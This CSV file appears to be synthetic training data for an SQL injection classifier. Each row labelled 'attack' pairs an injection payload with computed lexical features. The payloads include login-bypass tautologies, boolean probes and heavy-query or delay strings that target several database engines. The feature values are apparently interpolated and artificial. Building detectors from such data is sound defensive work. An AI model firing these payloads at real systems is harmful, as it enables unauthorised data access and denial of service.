id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000398,attack,boolean,1' where 3900  =  3900 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,nearest_attack_euclidean,R000199,0.9600830947552477,357.97574870012846,29.581312391677372,3.277776461588384,85.90656195838685,55.0,167.19721815422554,49.87196858751605,0.2398193056431766,0.15378031393346958,0.46707085117046226,0.1393295292528915,1.290656195838685,0.0,1.4186876083226299,0.0,0.0,2.0,0.0,34.58131239167737,0.0,0.0,0.0,14.0,1.0,0.0,0.7093438041613149,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.290656195838685,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,17.290656195838686
SMOTE_000399,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and '%'  =  '",nearest_attack_euclidean,R000695,0.9090900730289457,117.84263097878731,28.31425830045907,4.062714539987911,67.59990405160674,6.6428228755738346,25.942774901377206,17.657129150229533,0.5760416543296609,0.054844385366653134,0.2178463973907904,0.15126756291289556,3.3285645751147674,0.0,0.0,0.0,1.0,1.0,0.0,2.657129150229535,0.6714354248852328,5.0,4.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.32856457511476705,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.3285645751147674
SMOTE_000400,attack,boolean,"1   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000308,0.1762370924259643,135.1302688001747,26.11596415997671,3.7655170539500538,62.0,10.0,43.18825088016304,19.942017920011644,0.45915917199739725,0.07405793096732213,0.3191462258443417,0.14763667119093887,0.0,0.057982079988354474,2.0,0.0,1.0,1.0,0.0,6.826053760034936,0.05798207998835456,5.0,4.0,4.0,0.0,0.057982079988354474,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.0
SMOTE_000401,attack,boolean,"1%'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  '%'  =  '",nearest_attack_euclidean,R000749,1.2709931770552196,158.77054766146642,30.0,3.8179440000968725,74.47082190645865,8.0,54.41643812917315,21.88328762583463,0.4716892221682054,0.05069750113543223,0.3399201771959525,0.13769309950040984,4.0,0.0,0.0,0.0,1.0,2.0,0.0,7.88328762583463,1.9999999999999998,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.4708219064586574,0.5291780935413425,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,4.0
SMOTE_000402,attack,boolean,"1"" where 4161  =  4161 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000359,0.6134104213542388,128.096736774782,35.516122795796996,3.893517586958223,38.29030698949249,23.0,49.548368387390994,17.258061397898498,0.2987275394464016,0.17984087907620522,0.38662205449543585,0.1348095269819573,2.0,1.0,2.0,0.9999999999999999,0.0,2.0,0.0,8.258061397898498,0.0,0.0,1.0,5.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.7419386021015013,0.2580613978984987,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000403,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000340,0.4952479802083904,122.6404242233437,31.82397171844375,3.5827279001847296,39.58425453400622,10.880141407781231,53.17602828155625,19.0,0.32220829775269666,0.08822300782100685,0.4343321549351564,0.1552365394911401,2.0,3.1760282815562464,0.0,0.9999999999999999,0.0,1.0,0.0,10.0,0.8239717184437534,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.8239717184437536,0.0,0.0,0.0,1.1760282815562464,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000404,attack,boolean,"1'+  (  select inrv where 2178  =  2178 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000240,0.3332240698568472,156.7732352618827,33.867913601933836,4.139441464535009,80.71654407735338,16.660431990330828,42.528345592264664,16.867913601933836,0.51070659944783,0.10775472031648804,0.2735128200373411,0.10802586019834087,1.0,0.0,2.0,0.0,1.0,2.0,0.0,5.264172796132332,0.0,0.1320863980661655,1.8679136019338343,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,2.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,5.0
SMOTE_000405,attack,boolean,"1""   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  ""czvm"" like ""czvm",nearest_attack_euclidean,R000207,0.4676276964358571,96.03167692434525,25.19045734300325,3.3809533714010405,23.920609790670998,13.0,44.3809146860065,14.73015244766775,0.24877736985397128,0.1357424471973728,0.46192073179462373,0.1535594511540322,0.0,3.9999999999999996,0.0,0.0,0.0,1.2698475523322503,0.0,7.460304895335499,0.0,1.0,1.0,1.2698475523322506,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000406,attack,boolean,1   )    )     )   and 2006  =  2006,nearest_attack_euclidean,R000539,1.1261570899560118,34.169893944507265,10.45752651387319,2.421966979196054,3.0,9.0,18.169893944507244,4.0,0.08809923451951235,0.2642977035585371,0.530137415895934,0.1174656460260165,0.0,0.4575265138731882,0.0,0.0,0.0,1.0,0.0,2.542473486126813,0.0,0.0,0.0,1.0,0.0,0.45752651387318827,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.0
SMOTE_000407,attack,boolean,"1' and elt  (  4249  =  4249,7259  )   and 'nsbj' like 'nsbj",nearest_attack_euclidean,R000504,0.1579149416703309,60.0,23.846938554662565,3.911758300586964,21.0,13.0,18.0,8.0,0.35,0.21666666666666667,0.3,0.13333333333333333,4.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000408,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'bxjo' like 'bxjo",nearest_attack_euclidean,R000149,0.07714985927756272,143.4603968728435,32.0,4.182377686130725,85.46039687284348,8.0,35.0,15.0,0.595537382240126,0.055787947277224,0.24407226933785497,0.104602401144795,4.0,0.0,0.0,0.0,1.0,1.0,0.0,4.0,0.0,0.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,4.0
SMOTE_000409,attack,boolean,"1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000150,0.07251578002030165,124.4729194101149,33.0,3.7815599593855964,43.23866137016597,15.0,49.1756935299617,17.05856450998723,0.3470361529121166,0.12054525578263975,0.3952957682861781,0.1371228230190656,3.0,0.0,2.0,0.9999999999999999,0.0,1.0,0.0,9.058564509987233,0.0,0.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.0
SMOTE_000410,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000284,0.22597498382431602,90.17765994103388,27.220811238943856,3.625840020713159,32.147207492629235,8.368018731573091,35.441622477887705,14.220811238943856,0.35691988750464604,0.09238441814678801,0.39305364393748743,0.15764205041107848,3.0736037463146184,0.0,0.0,0.0,1.0,1.0736037463146182,0.0,6.0,1.0736037463146182,1.0,1.0,2.073603746314618,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.07360374631461813,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.0736037463146184
SMOTE_000411,attack,boolean,or 'unusual'   =   'unusual',nearest_attack_euclidean,R000008,0.31056494567686665,26.877879888945685,10.10201091918676,2.9880534455856345,15.081901727319199,0.20402183837351018,6.897989080813254,4.693967242439731,0.555141113743291,0.01200128461020658,0.2605011240339308,0.17235647761257158,3.693967242439732,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.0
SMOTE_000412,attack,boolean,"-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl",nearest_attack_euclidean,R000159,0.02193326106590203,101.98764986778787,28.97529973557574,3.49434667161849,23.950599471151477,16.0,46.02470026442426,16.01235013221213,0.23483377492045637,0.15688192604498097,0.4512800944528279,0.15700420458173475,4.0,0.0,1.0,0.0,0.0,1.0123501322121315,0.0,8.0,0.0,1.0,1.0,2.0123501322121315,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000413,attack,boolean,"1   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000308,0.7499865212108153,136.541586064294,26.54158606429401,3.7689086120613804,62.0,10.0,44.0,20.54158606429401,0.4540932259171873,0.07324084288986892,0.32225970871542325,0.1504062224775205,0.0,0.27079303214700357,2.0,0.0,1.0,1.0,0.0,7.0,0.27079303214700373,5.0,4.0,4.0,0.0,0.2707930321470037,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.0
SMOTE_000414,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  'fwok' like 'fwok",nearest_attack_euclidean,R000709,0.08000851560627543,123.90246448135807,28.03901420745677,4.116632439225612,83.39527978442004,3.214578141012243,25.234085244740626,12.058521311185157,0.6728929030112502,0.026016555708962025,0.20374525334195487,0.09734528793783292,3.0,0.0,0.0,0.0,0.9804928962716144,0.0,0.0,3.097535518641928,0.0,0.0195071037283856,2.019507103728386,0.9804928962716151,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.9804928962716144,0.0,0.0,0.9804928962716144,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.019507103728385822,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.980492896271614
SMOTE_000415,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  ""ymss""  =  ""ymss",nearest_attack_euclidean,R000423,0.594829085986193,139.49023003186306,28.029118791740977,3.8768580298617157,72.54367818761146,6.28639848967622,40.631034562834394,20.029118791740977,0.5233390202157338,0.044035889591708705,0.2888203894332636,0.14380470075929389,0.0,3.257279697935244,0.0,0.0,1.0,1.0,0.0,5.771839093805732,0.0,5.0,4.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.2572796979352441,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.2572796979352443
SMOTE_000416,attack,boolean,"1%'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  '%'  =  '",nearest_attack_euclidean,R000590,0.04308929663259539,153.50403637055237,30.973471769970928,4.086886986500201,75.0,8.973471769970928,47.47750814052329,22.053056460058144,0.4887595862672356,0.05849691645655042,0.30906555084678916,0.14367794642942483,4.0,0.0,0.0,0.0,1.0,2.0,0.0,6.106112920116287,1.9999999999999998,0.0,2.973471769970928,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,4.0
SMOTE_000417,attack,boolean,"1'||  (  select 'eamo' where 4958  =  4958 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   ||'",nearest_attack_euclidean,R000589,0.8824268648539781,175.21128499455642,36.26338549836693,3.9684558279953075,55.36902799564514,24.0,63.84225699891128,32.0,0.3156317071350969,0.13708536590516124,0.3645024390861935,0.18278048787354834,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,0.0,2.0,1.0,12.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,1.0,0.0,1.0,0.42112849945564257,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.4211284994556426
SMOTE_000418,attack,boolean,admin'  )   or '1'  =  '1,nearest_attack_euclidean,R000041,0.5775831155533422,32.986425717331855,12.90412366611304,2.917940858286034,7.904123666113044,3.506872776855067,14.520618330565206,7.0548109437985485,0.2629221085289759,0.09112767589062205,0.41700061594400595,0.22894959963639616,4.0,0.0,0.15068727768550683,0.0,0.0,1.150687277685507,0.0,1.7534363884275344,0.0,0.0,0.0,1.301374555371014,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.15068727768550694,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.150687277685507
SMOTE_000419,attack,boolean,"1  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  9112  =  9112",nearest_attack_euclidean,R000227,0.5016094721162558,129.21425012957752,32.78574987042247,3.6367846573503795,34.21425012957752,23.0,56.0,16.0,0.26477959226653935,0.17800073029336416,0.43339308245340835,0.1238265949866881,2.0,0.0,0.0,0.9999999999999999,0.0,2.0,0.0,10.0,0.0,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.2142501295775265,0.7857498704224735,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000420,attack,boolean,-5995'   )    )    or 6872  =  6872 and    (    (   'pywh'  =  'pywh,nearest_attack_euclidean,R000338,0.8536005491898299,88.17254430525227,21.98056081509872,3.11046494775254,16.09599174507678,13.769138140043875,43.53827628008775,14.769138140043875,0.18053367353994787,0.15586725606250254,0.4962025612638681,0.16739650913368148,4.0,0.0,1.0,0.0,0.0,2.0,0.0,6.8845690700219375,0.0,0.442284535010969,0.442284535010969,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000421,attack,boolean,"1   )    )    as cbdx where 8998  =  8998 and elt  (  4249  =  4249,7259  )  --",nearest_attack_euclidean,R000209,0.32520829196473805,73.9900275030883,24.664007334156878,3.5304357431370654,14.996011001235317,21.0,29.32801466831376,8.666001833539221,0.20072278511572172,0.2866316104499893,0.3950222070209575,0.11762339741333143,0.0,0.0,2.0,0.0,0.0,2.0,0.0,3.6660018335392195,0.0,0.0,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000422,attack,boolean,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000605,0.1125801613217886,149.4855194819025,30.0,3.9255197110388766,76.37410552075981,8.14855194819025,45.0,19.96286201295244,0.5100615891291607,0.0544171051062729,0.30165151032613524,0.13386979543843125,0.0,3.9999999999999996,0.0,0.0,1.0,2.0,0.0,5.925724025904875,1.9999999999999998,0.0,2.1485519481902497,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,4.0
SMOTE_000423,attack,boolean,1' in boolean mode  )   and 7533  =  7533#,nearest_attack_euclidean,R000689,0.6264128968153451,52.026994267188485,19.4324277524555,3.6198001785875826,18.98422448428229,9.835582855599041,17.05854529862392,6.148641628683249,0.3743207709873092,0.2038646129120301,0.3171027923410344,0.10471182375962632,0.8806310206287082,0.0,0.0,0.0,0.0,1.0,0.0,2.0743208143416254,0.0,0.2387379587425832,0.11936897937129154,1.7162138762277497,0.8806310206287083,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.11936897937129164,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.0
SMOTE_000424,attack,boolean,"1"" or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and ""dtwv"" like ""dtwv",nearest_attack_euclidean,R000767,0.74511352935895,206.0525974362847,35.47091592440607,3.8423067905560426,67.26454203779697,24.7936261133909,81.40717705831506,32.5872522267818,0.32828201227928505,0.12058015828871844,0.3929861000598439,0.15815172937215258,0.0,3.9999999999999996,0.0,0.0,0.0,1.0,0.0,17.5872522267818,0.0,1.0,3.0,7.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.2645420377969663,0.7354579622030337,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,7.0
SMOTE_000425,attack,boolean,"1%'  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000547,0.2019082949855699,128.7312206009528,28.0,3.925328198726685,62.0,10.0,36.44268383412734,20.28853676682547,0.48261134174740106,0.0778405389915163,0.2819628488100928,0.15758527045098977,1.0,0.0,2.0,0.0,1.0,1.0,0.0,5.288536766825468,1.0,5.0,4.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.0
SMOTE_000426,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'hxcq'  =  'hxcq",nearest_attack_euclidean,R000561,0.1247073780486827,96.0,29.0,3.7942730099983057,39.3831329883639,8.38554188227256,35.308433505818044,12.922891623545487,0.41024096862879067,0.08734939460700585,0.36779618235227135,0.13461345441193215,2.845783247090975,0.0,0.0,0.0,1.0,1.0,0.0,6.077108376454513,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.0
